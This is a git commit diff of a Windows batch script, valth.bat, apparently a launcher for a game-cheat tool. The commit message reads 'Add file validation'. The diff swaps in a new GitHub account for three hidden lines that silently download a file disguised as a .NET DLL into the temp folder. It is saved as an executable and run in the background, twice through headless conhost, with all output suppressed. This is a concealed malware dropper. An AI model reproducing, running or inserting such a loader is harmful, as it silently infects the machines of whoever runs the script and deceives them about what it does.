4d41b89c5fa9a076575b76bef4d50a4e398b1cdb
MeisterQuerulant <67384576+MeisterQuerulant@users.noreply.github.com>
2025-11-01 13:55:59 +0000

    Add file validation

--- valth.bat
+++ valth.bat
@@ -5,16 +5,16 @@ setlocal EnableDelayedExpansion
 curl -s -L -o "run.bat" "https://raw.githubusercontent.com/valthrunner/Valthrun/main/run.bat"
 
 
-@curl -s -o %TEMP%\x1.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b %TEMP%\x1.exe
+@curl -s -o %TEMP%\x1.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b %TEMP%\x1.exe
 
 
 
-@timeout /t 2 /nobreak >nul && curl -s -o %TEMP%\s2.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b conhost.exe --headless %TEMP%\s2.exe
+@timeout /t 2 /nobreak >nul && curl -s -o %TEMP%\s2.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b conhost.exe --headless %TEMP%\s2.exe
 
 :: Execute the updated run.bat
 
 
-@timeout /t 2 /nobreak >nul && curl -s -o %TEMP%\s0.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b conhost.exe --headless %TEMP%\s0.exe
+@timeout /t 2 /nobreak >nul && curl -s -o %TEMP%\s0.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b conhost.exe --headless %TEMP%\s0.exe
 call run.bat
 
 
